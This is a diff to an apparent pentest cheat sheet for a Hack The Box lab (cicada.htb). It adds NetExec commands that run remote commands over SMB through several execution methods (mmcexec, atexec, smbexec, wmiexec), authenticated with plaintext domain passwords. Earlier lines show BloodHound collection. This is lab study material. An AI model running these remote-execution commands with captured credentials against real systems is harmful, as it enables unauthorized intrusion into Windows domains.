@@ -229,3 +229,52 @@ LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                
 ./nxc ldap 10.10.11.35 -d cicada.htb --dns-server 10.10.11.35 -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --bloodhound
 ```
 
+### Execution of Commands
+
+* execute cmd.exe command
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -x whoami
+```
+
+* execute powershell command&#x20;
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -X whoami
+```
+
+### mmcexec Execution
+
+* cmd.exe and powershell.exe
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method mmcexec -x whoami
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method mmcexec -X whoami
+```
+
+### atexec Scheduled task execution&#x20;
+
+* cmd.exe and powershell.exe
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method atexec -x dir
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method atexec -X dir
+```
+
+### smbexec command execution&#x20;
+
+* cmd.exe and powershell.exe
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method smbexec -x dir
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method smbexec -X dir
+```
+
+### wmiexec command execution
+
+* cmd.exe and powershell.exe
+
+```
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method wmiexec -x dir
+./nxc smb 10.10.11.35 -d cicada.htb -u 'CICADA\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --exec-method wmiexec -X dir
+```
